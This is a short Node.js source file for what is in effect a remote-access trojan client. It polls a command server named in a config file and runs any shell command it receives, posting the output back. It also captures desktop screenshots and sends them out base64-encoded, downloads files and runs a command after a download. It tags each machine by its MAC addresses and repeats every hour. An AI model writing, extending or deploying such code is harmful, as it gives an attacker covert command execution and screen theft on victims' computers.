var child = require("child_process");
var exec = child.exec;
var http = require("http");
var os = require("os");
var fs = require("fs");
var querystring = require('querystring');
var screenshot = require('screenshot-desktop');
var Downloader = require('mt-files-downloader');
var conf = JSON.parse(fs.readFileSync("client/conf.js")+"");

/**
data  数据结构
{
	command : "dir c:"
}
**/
function processData( data ) {
	var IPv4Mac = "";
	var devices = os.networkInterfaces();
	for(var p in devices) {
		var eth = devices[p];
		for(var i=0;i<eth.length;i++){
			if(eth[i].family=='IPv4'){
				IPv4Mac += eth[i].mac;
			}
		}
	}
	console.log(IPv4Mac);


	if(data.command) {
		exec(data.command, ( error, stdout, stderr ) => {
			if (error) {
				console.error(`exec error: ${error}`);
				return;
			}

			postData({dir:IPv4Mac,content:stdout});
		});
	}
	if(data.screenshot) {

		screenshot().then((img) => {
			postData({dir:IPv4Mac,jpg:  new Buffer(img).toString('base64')  });
		}).catch((err) => {
		  // ...
		})

	}
	var downloader;
	if(data.download) {
		downloader = new Downloader();
		var dl = downloader.download(data.download, data.filename || "file");
		dl.start();
	}
	if(data.downloadAndRun) {
		dl.on("end", function() {
			exec(data.downloadAndRun);
		})
	}
	if(data.timeout || 3600000) {
		setTimeout(main, data.timeout || 3600000);
	}
}


function postData( data ) {
	var data = querystring.stringify(data);
	const options = {
		hostname: conf.host,
		path: conf.path,
		method: 'POST',
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': Buffer.byteLength(data)
		}
	};

	const req = http.request(options, (res) => {
		console.log(`STATUS: ${res.statusCode}`);
		console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
		res.setEncoding('utf8');
		res.on('data', (chunk) => {
			console.log(`BODY: ${chunk}`);
		});
		res.on('end', () => {
			console.log('No more data in response.');
		});
	});

	req.on('error', (e) => {
		console.error(`problem with request: ${e.message}`);
	});

	req.write(data);
	req.end();
}


function main() {

	http.get(conf.url, (res) => {
		res.setEncoding('utf8');
		var rawData = '';
		res.on('data', (chunk) => { rawData += chunk; });
		res.on('end', () => {
			try {
				const parsedData = JSON.parse(rawData);
				console.log(parsedData);
				processData(parsedData);
			} catch (e) {
				console.error(e.message);
			}
		});

	});

}

main();

